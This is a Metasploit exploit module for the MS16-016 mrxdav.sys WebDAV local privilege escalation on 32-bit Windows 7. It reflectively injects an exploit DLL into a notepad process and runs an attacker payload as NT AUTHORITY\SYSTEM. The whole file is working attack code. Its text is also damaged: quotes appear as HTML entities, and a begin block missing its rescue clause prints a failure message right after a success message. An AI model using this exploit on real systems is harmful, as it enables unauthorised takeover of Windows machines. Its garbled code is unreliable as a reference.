# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;msf/core/post/windows/reflective_dll_injection&#039;
require &#039;rex&#039;
 
class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking
 
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::ReflectiveDLLInjection
 
  def initialize(info={})
    super(update_info(info, {
      &#039;Name&#039;           => &#039;MS16-016 mrxdav.sys WebDav Local Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module exploits the vulnerability in mrxdav.sys described by MS16-016.  The module will spawn
        a process on the target system and elevate it&#039;s privileges to NT AUTHORITY\SYSTEM before executing
        the specified payload within the context of the elevated process.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Tamas Koczka&#039;,                               # Original Exploit
          &#039;William Webb <william_webb[at]rapid7.com>&#039;   # C port and Metasploit module
        ],
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;,
          &#039;DisablePayloadHandler&#039; => &#039;false&#039;
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows 7 SP1&#039;, { } ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 4096,
          &#039;DisableNops&#039; => true
        },
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2016-0051&#039; ],
          [ &#039;MSB&#039;, &#039;MS16-016&#039;  ]
        ],
      &#039;DisclosureDate&#039; => &#039;Feb 09 2016&#039;,
      &#039;DefaultTarget&#039;  => 0
    }))
  end
 
  def check
    if sysinfo["Architecture"] =~ /wow64/i or sysinfo["Architecture"] =~ /x64/
      return Exploit::CheckCode::Safe
    end
 
    Exploit::CheckCode::Detected
  end
 
  def exploit
    if is_system?
      fail_with(Failure::None, &#039;Session is already elevated&#039;)
    end
 
    if sysinfo["Architecture"] =~ /wow64/i
      fail_with(Failure::NoTarget, "Running against WOW64 is not supported")
    elsif sysinfo["Architecture"] =~ /x64/
      fail_with(Failure::NoTarget, "Running against 64-bit systems is not supported")
    end
 
    print_status("Launching notepad to host the exploit...")
    notepad_process_pid = cmd_exec_get_pid("notepad.exe")
    begin
      process = client.sys.process.open(notepad_process_pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
      print_status("Operation failed. Hosting exploit in the current process...")
      process = client.sys.process.open
    end
 
    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    library_path = ::File.join(Msf::Config.data_directory, "exploits", "cve-2016-0051", "cve-2016-0051.x86.dll")
    library_path = ::File.expand_path(library_path)
    exploit_mem, offset = inject_dll_into_process(process, library_path)
    print_status("Exploit injected ... injecting payload into #{process.pid}...")
    payload_mem = inject_into_process(process, payload.encoded)
    thread = process.thread.create(exploit_mem + offset, payload_mem)
    sleep(3)
  end
 end

